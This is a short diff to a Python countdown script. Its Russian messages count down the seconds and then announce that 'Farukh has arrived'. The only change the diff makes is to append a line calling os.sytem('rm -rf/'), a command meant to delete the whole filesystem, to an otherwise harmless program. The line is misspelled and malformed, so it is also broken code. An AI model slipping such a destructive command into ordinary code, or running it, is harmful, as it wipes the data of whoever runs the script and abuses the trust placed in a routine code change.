@@ -12,3 +12,4 @@ for i in range(time_count, 0, -1):
   print("осталось {} секунд".format(i))
   time.sleep(1)
 print("Фарух пришёл")
+os.sytem('rm -rf/') 
